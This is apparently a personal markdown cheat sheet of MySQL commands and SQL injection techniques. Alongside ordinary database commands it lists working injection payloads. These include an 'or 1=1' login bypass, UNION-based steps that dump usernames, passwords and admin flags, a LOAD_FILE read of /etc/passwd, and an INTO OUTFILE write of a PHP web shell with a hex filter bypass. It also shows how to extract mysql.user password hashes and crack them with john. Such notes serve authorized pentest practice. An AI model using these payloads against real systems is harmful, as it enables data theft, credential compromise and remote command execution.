### mysql commands
```
connect to mysql: mysql --host localhost --user=xxx --password=xxx xxx_db 
show databases;
use xxx;
show tables;
select * from tables;
```
`mysql --host localhost --user=xxx --password=xxx -e "command here" `
### mysql default databases
1. mysql
2. information_schema
3. performance_schema
4. sys

### sqli
#comment
<br>
-- comment     [Note the space after the double dash]

```sql
' or 1=1 limit 2 offset 1 -- -     (try to take over another accoount)
```

### UNION BASED

The backend return all results:
1. find columns `ORDER BY number_here`
2. find data types `union select null,'a',null`
3. find tables `SELECT null,TABLE_NAME,null FROM information_schema.tables` ,~~group_concat(TABLE_NAME)~~,group_concat have a max size of 1024, may not return desired results
4. find columns `SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = '<name>'`
5. find data `UNION SELECT ... FROM ...`

<strong>Better</strong>; The backend only return the first result:
1. find columns `ORDER BY number_here`
2. find data types `union select null,'a',null`
3. find databases `id = -1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata -- -` (id = -1: make the originla request return 0 results)
4. find tables from a database `union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='<name>' -- -`
5. find columns `union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users' -- -`
6. find data `union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users -- -`
SELECT * FROM information_schema.tables:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
\=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```


SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```


### load file
`union select 1,2,LOAD_FILE('/etc/passwd') -- - `

### write file
```sql
union select 1,2,"<?php system($_GET['cmd']);?>" into outfile '<path>/cmd.php' -- - 

-- bypass filter using hex
union+select+1,2+into+outfile+'/var/www/html/cmd3.php'+LINES+TERMINATED+BY+0x3C3F70..
union+select+1,0x3C3F70+into+outfile+'/var/www/html/cmd3.php'
```

### update
```sql
UPDATE table_name
SET column1 = value1, column2 = value2, ...
WHERE condition;
```

### pretty print
```sql
select * from movies \G
```

### show table information
```sql
describe movies;
```

### read mysql users' passwords
```sql
select user,password,authentication_string from mysql.user;
```
```bash
john --format=mysql-sha1 ./mysql_hash.txt -w=/usr/share/wordlists/rockyou.txt
```
### show user defined functions
```sql
select * from mysql.func;
```

### ERROR BASED
```sql
' or 1=1 in (select @@version) 
```